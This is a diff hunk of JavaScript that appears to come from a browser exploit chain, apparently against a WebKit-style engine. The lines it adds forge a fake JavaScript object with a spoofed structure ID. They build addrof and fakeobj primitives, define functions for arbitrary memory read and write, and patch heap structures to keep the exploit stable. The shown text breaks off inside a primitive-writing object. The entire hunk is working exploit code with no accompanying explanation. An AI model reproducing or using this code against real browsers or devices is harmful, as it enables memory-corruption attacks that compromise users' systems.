@@ -678,7 +678,124 @@ function run_hax() {
     load_exploit_done(); 
     }
 }
-
+var arw_master = new Uint32Array(8);
+var arw_slave = new Uint8Array(1);
+var obj_master = new Uint32Array(8);
+var obj_slave = {
+obj: null
+};
+var addrof_slave = boot_addrof(arw_slave);
+var addrof_obj_slave = boot_addrof(obj_slave);
+union_i[0] = structureid_low;
+union_i[1] = structureid_high;
+union_b[6] = 7;
+var obj = {
+jscell: union_f[0],
+butterfly: true,
+buffer: arw_master,
+size: 0x5678
+};
+function i48_put(x, a) {
+a[4] = x | 0;
+a[5] = (x / 4294967296) | 0;
+}
+function i48_get(a) {
+return a[4] + a[5] * 4294967296;
+}
+window.addrof = function (x) {
+obj_slave.obj = x;
+return i48_get(obj_master);
+}
+window.fakeobj = function (x) {
+i48_put(x, obj_master);
+return obj_slave.obj;
+}
+function read_mem_setup(p, sz) {
+i48_put(p, arw_master);
+arw_master[6] = sz;
+}
+window.read_mem_s = function(p, sz)
+{
+read_mem_setup(p, sz);
+return ""+arw_slave;
+}
+window.read_mem_b = function(p, sz)
+{
+read_mem_setup(p, sz);
+var b = new Uint8Array(sz);
+b.set(arw_slave);
+return b;
+}
+window.read_mem_as_string = function(p, sz)
+{
+var x = read_mem_b(p, sz);
+var ans = '';
+for(var i = 0; i < x.length; i++)
+ans += String.fromCharCode(x[i]);
+return ans;
+}
+window.ref_mem = function(p, sz)
+{
+read_mem_setup(p, sz);
+return arw_slave;
+}
+window.read_mem = function (p, sz) {
+read_mem_setup(p, sz);
+var arr = [];
+for (var i = 0; i < sz; i++)
+arr.push(arw_slave[i]);
+return arr;
+};
+window.write_mem = function (p, data) {
+read_mem_setup(p, data.length);
+for (var i = 0; i < data.length; i++)
+arw_slave[i] = data[i];
+};
+window.read_ptr_at = function (p) {
+var ans = 0;
+var d = read_mem(p, 8);
+for (var i = 7; i >= 0; i--)
+ans = 256 * ans + d[i];
+return ans;
+};
+window.write_ptr_at = function (p, d) {
+var arr = [];
+for (var i = 0; i < 8; i++) {
+arr.push(d & 0xff);
+d /= 256;
+}
+write_mem(p, arr);
+};
+(function () {
+var magic = boot_fakeobj(boot_addrof(obj) + 16);
+magic[4] = addrof_slave;
+magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
+obj.buffer = obj_master;
+magic[4] = addrof_obj_slave;
+magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
+magic = null;
+})();
+(function () {
+var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
+write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
+for (var i = 0; i < needfix.length; i++) {
+var addr = read_ptr_at(addrof(needfix[i]) + 8);
+write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
+write_ptr_at(addr + 8, addr + 20);
+write_ptr_at(addr + 16, 0x80000014);
+}
+write_ptr_at(butterfly + 248, 0x1f0000001f);
+})();
+var expl_master = new Uint32Array(8);
+var expl_slave = new Uint32Array(2);
+var addrof_expl_slave = addrof(expl_slave);
+var m = fakeobj(addrof(obj) + 16);
+obj.buffer = expl_slave;
+m[7] = 1;
+obj.buffer = expl_master;
+m[4] = addrof_expl_slave;
+m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
+m[7] = 1;
 var prim = {
 write8: function (addr, value) {
 expl_master[4] = addr.low;
